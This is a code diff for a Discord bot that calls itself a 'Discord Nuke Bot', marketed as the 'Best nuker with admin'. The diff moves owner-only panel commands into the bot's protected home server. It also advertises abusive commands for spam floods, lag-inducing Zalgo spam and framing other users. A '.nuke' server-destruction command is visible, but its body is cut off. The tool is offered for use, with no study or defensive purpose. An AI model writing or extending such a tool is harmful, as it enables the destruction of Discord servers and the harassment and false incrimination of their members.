@@ -27,18 +27,10 @@ const sleep = ms => new Promise(r => setTimeout(r, ms));
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
-    const isProtected = message.guild && message.guild.id === WHITELIST_SERVER;
-    if (isProtected && message.content !== '.panel' && message.content !== '.extpanel') {
-        if (message.content.startsWith('.')) {
-            return message.reply('Server protected').catch(() => {});
-        }
-        return;
-    }
-
     const args = message.content.trim().split(/\s+/);
     const cmd = args[0].toLowerCase();
 
-    // .whitelist
+    // .whitelist — works everywhere, owner only
     if (cmd === '.whitelist') {
         if (message.author.id !== OWNER_ID) {
             return message.reply('You are not the owner').catch(() => {});
@@ -53,55 +45,88 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // .extpanel
+    // Protected server checks
+    const isProtected = message.guild && message.guild.id === WHITELIST_SERVER;
+    const isOwner = message.author.id === OWNER_ID;
+
+    if (isProtected) {
+        // Owner can use .panel and .extpanel in protected server
+        if (cmd === '.panel' && isOwner) {
+            const embed = new EmbedBuilder()
+                .setTitle('Discord Nuke Bot')
+                .setDescription('**Best nuker with admin**\nClick the button below to invite.')
+                .setColor(0xff0000);
+            const inviteBtn = new ButtonBuilder().setLabel('Invite').setStyle(ButtonStyle.Link).setURL(INVITE_URL);
+            const cmdsBtn = new ButtonBuilder().setLabel('Commands').setStyle(ButtonStyle.Primary).setCustomId('cmds');
+            const row = new ActionRowBuilder().addComponents(inviteBtn, cmdsBtn);
+            message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
+            return;
+        }
+        if (cmd === '.extpanel' && isOwner) {
+            const embed = new EmbedBuilder()
+                .setTitle('External Bot Commands')
+                .setDescription(
+                    `**Slash Commands (User Install)**\n` +
+                    `/say — Make bot say anything (free)\n` +
+                    `/blame — Frame someone (free)\n` +
+                    `/spam — Arabic flood (premium)\n` +
+                    `/flood — JHUB flood (premium)\n` +
+                    `/custom-spam — Spam anything (premium)\n` +
+                    `/l-spam — Zalgo lag spam (premium)\n\n` +
+                    `Get whitelisted by the owner to use premium commands.`
+                )
+                .setColor(0x00ff00)
+                .setFooter({ text: 'Click below to add the external bot' });
+            const extBtn = new ButtonBuilder().setLabel('Add External Bot').setStyle(ButtonStyle.Link).setURL(EXT_INVITE);
+            const row = new ActionRowBuilder().addComponents(extBtn);
+            message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
+            return;
+        }
+        // Block everything else in protected server
+        if (message.content.startsWith('.')) {
+            return message.reply('Server protected').catch(() => {});
+        }
+        return;
+    }
+
+    // .panel — anywhere except protected (owner bypasses above)
+    if (cmd === '.panel') {
+        const embed = new EmbedBuilder()
+            .setTitle('Discord Nuke Bot')
+            .setDescription('**Best nuker with admin**\nClick the button below to invite.')
+            .setColor(0xff0000);
+        const inviteBtn = new ButtonBuilder().setLabel('Invite').setStyle(ButtonStyle.Link).setURL(INVITE_URL);
+        const cmdsBtn = new ButtonBuilder().setLabel('Commands').setStyle(ButtonStyle.Primary).setCustomId('cmds');
+        const row = new ActionRowBuilder().addComponents(inviteBtn, cmdsBtn);
+        message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
+        return;
+    }
+
+    // .extpanel — anywhere except protected
     if (cmd === '.extpanel') {
         const embed = new EmbedBuilder()
             .setTitle('External Bot Commands')
             .setDescription(
                 `**Slash Commands (User Install)**\n` +
                 `/say — Make bot say anything (free)\n` +
+                `/blame — Frame someone (free)\n` +
                 `/spam — Arabic flood (premium)\n` +
                 `/flood — JHUB flood (premium)\n` +
                 `/custom-spam — Spam anything (premium)\n` +
-                `/l-spam — Zalgo lag spam (premium)\n` +
-                `/blame — Frame someone (premium)\n\n` +
+                `/l-spam — Zalgo lag spam (premium)\n\n` +
                 `Get whitelisted by the owner to use premium commands.`
             )
             .setColor(0x00ff00)
             .setFooter({ text: 'Click below to add the external bot' });
-
-        const extBtn = new ButtonBuilder()
-            .setLabel('Add External Bot')
-            .setStyle(ButtonStyle.Link)
-            .setURL(EXT_INVITE);
+        const extBtn = new ButtonBuilder().setLabel('Add External Bot').setStyle(ButtonStyle.Link).setURL(EXT_INVITE);
         const row = new ActionRowBuilder().addComponents(extBtn);
-        message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
-        return;
-    }
-
-    // .panel
-    if (cmd === '.panel') {
-        const embed = new EmbedBuilder()
-            .setTitle('Discord Nuke Bot')
-            .setDescription('**Best nuker with admin**\nClick the button below to invite.')
-            .setColor(0xff0000);
-
-        const inviteBtn = new ButtonBuilder()
-            .setLabel('Invite')
-            .setStyle(ButtonStyle.Link)
-            .setURL(INVITE_URL);
-        const cmdsBtn = new ButtonBuilder()
-            .setLabel('Commands')
-            .setStyle(ButtonStyle.Primary)
-            .setCustomId('cmds');
-        const row = new ActionRowBuilder().addComponents(inviteBtn, cmdsBtn);
         message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
         return;
     }
 
     // .nuke
     if (cmd === '.nuke') {
-        if (message.guild.id === WHITELIST_SERVER) return message.reply('Server protected').catch(() => {});
+        if (isProtected) return message.reply('Server protected').catch(() => {});
         message.delete().catch(() => {});
         const g = message.guild;
         const originalName = g.name;
